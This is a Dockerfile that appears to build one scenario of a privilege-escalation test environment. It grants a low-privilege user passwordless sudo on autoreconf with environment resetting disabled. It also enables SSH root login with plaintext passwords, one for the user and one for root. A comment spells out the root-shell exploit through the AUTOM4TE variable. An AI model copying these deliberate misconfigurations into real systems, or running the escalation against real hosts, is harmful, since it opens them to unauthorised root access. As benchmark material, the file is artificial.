FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_autoreconf
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/autoreconf as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and autoconf (provides autoreconf)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        autoconf \
        automake \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify autoreconf is installed
RUN which autoreconf && ls -la /usr/bin/autoreconf

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# autoreconf calls AUTOM4TE (defaults to autom4te) as a subprocess.
# By setting AUTOM4TE env var to a malicious script, the attacker can
# execute arbitrary commands as root:
#   echo '/bin/sh 1>&0' > /tmp/exploit.sh
#   chmod +x /tmp/exploit.sh
#   echo 'AC_INIT' > configure.ac
#   sudo AUTOM4TE=/tmp/exploit.sh autoreconf
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/autoreconf" > /etc/sudoers.d/autoreconf && \
    chmod 440 /etc/sudoers.d/autoreconf

# Ensure sudo preserves environment variables (needed for AUTOM4TE to be passed through)
# By default sudo may reset env; we need to allow env passing for this exploit
RUN echo "Defaults:lowpriv !env_reset" >> /etc/sudoers.d/autoreconf && \
    chmod 440 /etc/sudoers.d/autoreconf

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]